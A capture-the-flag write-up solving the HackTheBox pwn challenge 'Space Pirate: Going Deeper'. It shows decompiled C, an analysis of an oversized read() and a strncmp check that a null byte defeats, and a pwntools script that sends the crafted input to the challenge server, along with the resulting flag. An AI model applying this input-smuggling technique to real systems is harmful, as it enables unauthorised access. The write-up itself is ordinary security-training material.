# CTF HackTheBox 2021 Cyber Apocalypse 2021 - Space Pirate: Going Deeper

Category: Pwn, Points: 375

![info.JPG](images/info.JPG)


Attached file [pwn_sp_going_deeper.zip](./pwn_sp_going_deeper.zip)

# Space Pirate: Entrypoint Solution

Let's check the binary using ```checksec```:
```
┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Pirate_Going_Deeper]
└──╼ $ checksec sp_going_deeper
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  './glibc/'

```

[Full RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/) (removes the ability to perform a "GOT overwrite" attack), No canary, and no PIE.

By running the binary we get:
```console
┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Going_Deeper]
└──╼ $ ./sp_going_deeper 


                  Trying to leak information from the pc.. 🖥️


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   | goldenfang@d12:$ history                    |    |
           |   |     1 ls                                    |    |
           |   |     2 mv secret_pass.txt flag.txt           |    |
           |   |     3 chmod -x missile_launcher.py          |    |
           |   |     4 ls                                    |    |
           |   |     5 history                               |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>> 
```

By decompiling the binary using [Ghidra](https://github.com/NationalSecurityAgency/ghidra) we can see the following ```main``` function:
```c
undefined8 main(void)
{
  setup();
  banner();
  puts("\x1b[1;34m");
  admin_panel(1,2,3);
  return 0;
}
```

Let's observe on ```admin_panel()``` function:
```c
void admin_panel(long param_1,long param_2,long param_3)
{
  int iVar1;
  char local_38 [40];
  long local_10;
  
  local_10 = 0;
  printf("[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld].\n[*] If you want to continue, disable the mechanism or login as admin.\n"
         ,param_1,param_2,param_3);
  while (((local_10 != 1 && (local_10 != 2)) && (local_10 != 3))) {
    printf(&DAT_004014e8);
    local_10 = read_num();
  }
  if (local_10 == 1) {
    printf("\n[*] Input: ");
  }
  else {
    if (local_10 != 2) {
      puts("\n[!] Exiting..\n");
                    /* WARNING: Subroutine does not return */
      exit(0x1b39);
    }
    printf("\n[*] Username: ");
  }
  read(0,local_38,0x39);
  if (((param_1 != 0xdeadbeef) || (param_2 != 0x1337c0de)) || (param_3 != 0x1337beef)) {
    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",local_38,0x34);
    if (iVar1 != 0) {
      printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
      goto LAB_00400b38;
    }
  }
  printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
  system("cat flag*");
LAB_00400b38:
  puts("\n[!] For security reasons, you are logged out..\n");
  return;
}
```


```read``` function reads ```0x39``` bytes where ```local_38``` buffer size is ```0x28```.

```strncmp``` comapres ```local_38``` with ```DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft``` where the length of this string is ```0x34```.

```strncmp``` will compare strings until the NULL string terminator ```\x00```.

We have to include ```\x00``` in our input to make ```strncmp``` ignore from ```\n``` character.

Let's solve it using the following ```python``` [./solve.py](./solve.py):
```python
from pwn import *

elf = ELF('./sp_going_deeper')
libc = elf.libc

if args.REMOTE:
    p = remote('46.101.27.51', 30335)
else:
    p = process(elf.path)

p.recvuntil('>')
p.sendline("1")
print(p.recvuntil(':'))
p.sendline(b"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00")
p.interactive()
```

Run it:
```console
┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Going_Deeper]
└──╼ $ python3 solve.py REMOTE
[*] '/ctf_htb/cyber_apocalypse/pwn/Space_Going_Deeper/sp_going_deeper'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
[*] '/ctf_htb/cyber_apocalypse/pwn/Space_Going_Deeper/glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 46.101.27.51 on port 30335: Done
b'> \n[*] Input:'
[*] Switching to interactive mode
 
[+] Welcome admin! The secret message is: HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}

[!] For security reasons, you are logged out..

[*] Got EOF while reading in interactive
$  
```

And we get the flag ```HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}```.